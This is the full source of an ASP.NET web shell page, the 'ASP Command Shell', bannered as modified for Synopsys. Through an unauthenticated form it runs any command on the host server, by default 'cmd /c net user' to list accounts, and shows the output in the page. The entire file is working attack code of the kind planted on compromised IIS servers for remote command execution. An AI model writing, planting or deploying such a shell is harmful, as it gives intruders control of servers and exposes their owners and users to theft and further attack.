<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>

<script runat="server">      

Sub RunCmd(Src As Object, E As EventArgs)            
  Dim myProcess As New Process()            
  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
  myProcessStartInfo.UseShellExecute = false            
  myProcessStartInfo.RedirectStandardOutput = true            
  myProcess.StartInfo = myProcessStartInfo            
  myProcessStartInfo.Arguments=xcmd.text            
  myProcess.Start()            

  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
  Dim myString As String = myStreamReader.Readtoend()            
  myProcess.Close()            
  mystring=replace(mystring,"<","&lt;")            
  mystring=replace(mystring,">","&gt;")            
  result.text= vbcrlf & "<pre>" & mystring & "</pre>"    
End Sub

</script>

<html>
<style>
body {
color: white;
background: black;
}
</style>
<body>    
<div align=center>
<table width="100%" cellspacing="0" cellpadding="0" style="background: #800080; box-shadow:5px 10px 5px black;" >
   <td width="100%" align=center valign="top" rowspan="1">
<div align=center><font color=white size=5 style="font-family: consolas, georgia, helvetica, times new roman, serif;">--==[[ ASP Command Shell ]]==--<br> --==[[ Modified for Synopsys ]]==-- <br>

       <font color=white size=1>  ####################################################################################################################################</font>
</font></div>
</table>

<div align=center  style="margin: 20px ; width: 40%;"><asp:Label id="rr" runat="server" width="500px" font size=5 face="comic sans ms">--==[[ Type Your Command ]]==--</asp:Label>  </div>
<br>    <hr>      
<form runat="server">  
<p><asp:Label id="L_p" runat="server" width="200px">c0mmand g0es h3r3</asp:Label>        
<asp:TextBox id="xpath" runat="server" Width="300px">cmd</asp:TextBox>        
<p><asp:Label id="L_a" runat="server" width="200px">Arguments</asp:Label>        
<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        
<p><asp:Label id="result" runat="server"></asp:Label>       
</form>
</body>
</html>
